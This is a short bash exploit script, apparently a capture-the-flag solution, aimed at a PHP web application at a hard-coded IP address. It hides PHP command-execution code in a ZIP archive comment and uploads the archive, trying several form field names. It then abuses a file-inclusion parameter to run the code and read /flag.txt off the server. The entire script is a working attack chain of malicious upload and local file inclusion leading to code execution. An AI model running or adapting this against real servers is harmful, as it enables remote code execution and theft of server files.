#!/usr/bin/env bash
set -euo pipefail

# Usage: BASE=http://localhost:8080 ./exploit.sh
BASE="${BASE:-http://72.61.165.28:8080}"

TMPDIR="$(mktemp -d)"
trap 'rm -rf "$TMPDIR"' EXIT

# 1) Build malicious ZIP with PHP in archive comment
printf x > "$TMPDIR/t"
(
  cd "$TMPDIR"
  zip -q p.zip t
  printf '%s' '<?=`cat /flag.txt`?>' | zip -q -z p.zip
)

# 2) Upload with a few common field names and parse the stored filename
RESP=""
NAME=""
for FIELD in archiveFile archive file upload zip; do
  set +e
  RESP=$(curl -fsSL -F "$FIELD=@$TMPDIR/p.zip;type=application/zip;filename=p.zip" "$BASE/" 2>&1)
  RC=$?
  set -e
  NAME=$(grep -oE '[0-9a-fA-F]{32,64}\.zip' <<<"$RESP" | head -n1 || true)
  if [[ $RC -eq 0 && -n "$NAME" ]]; then
    break
  fi
  NAME=""
  RESP=""
done

if [[ -z "$NAME" ]]; then
  printf 'Upload failed or could not parse saved name. Last response follows:\n%s\n' "$RESP" >&2
  exit 1
fi

# 3) Trigger inclusion and capture to file (avoids curl write error 23 to stdout)
OUT="$TMPDIR/out"
curl -fsSL -o "$OUT" "$BASE/?file=uploads/$NAME"

# Print likely flag token if present; else show a small preview
grep -aE -o '([A-Z0-9_]+{[^}]*})' "$OUT" | head -n1 || head -c 512 "$OUT" || true